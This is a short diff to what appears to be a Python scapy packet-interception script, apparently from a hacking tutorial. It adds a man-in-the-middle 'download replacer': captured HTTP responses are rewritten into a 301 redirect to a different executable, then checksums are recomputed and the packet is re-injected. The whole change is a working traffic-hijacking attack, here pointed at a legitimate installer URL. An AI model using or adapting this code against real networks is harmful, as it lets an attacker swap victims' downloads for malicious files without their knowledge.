@@ -17,8 +17,11 @@ def process_packet(packet):
             if scapy_packet[scapy.TCP].seq in ack_list:
                 ack_list.remove(scapy_packet[scapy.TCP].ack)
                 print("[+] Replacing file")
-            print(scapy_packet.show())
-
+                scapy_packet[scapy.Raw].load = "HTTP/1.1 301 Moved Permanently\nLocation: https://www.rarlab.com/rar/wrar56b1.exe"
+                del scapy_packet[scapy.IP].len
+                del scapy_packet[scapy.IP].chksum
+                del scapy_packet[scapy.TCP].chksum
+                packet.set_payload(str(scapy_packet))
     packet.accept()
 
 
